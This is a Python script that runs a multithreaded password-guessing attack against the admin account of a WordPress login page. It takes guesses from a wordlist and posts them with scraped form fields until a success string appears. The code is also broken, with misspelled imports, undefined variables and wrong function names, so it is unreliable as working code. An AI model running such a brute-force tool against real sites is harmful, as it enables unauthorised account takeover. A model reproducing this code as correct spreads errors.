#!/bin/bash/env python

from io import BytestIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPRess'
TARGET = "http://Target Website/wordpress/wp-login.php"
WORDLIST = 'Path to your wordlist'

def get_words():
    with open(WORDLIST) as f:
        raw_words = r.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):   # Find all input elements
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params 

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack berginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, password):
        for _ in range(10):
            t = threading.thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username 

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying usernmae/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f'\nBruteforcing successful!')
                print('Username is %s' % self.username)
                print('Paasword is %s\n' % brute)
                print('done: now cleaning up other threads...')

if __name__ == '__main__':
    words = get_words()
    b = Bruter('admin', url)
    b.run_bruteforce(words)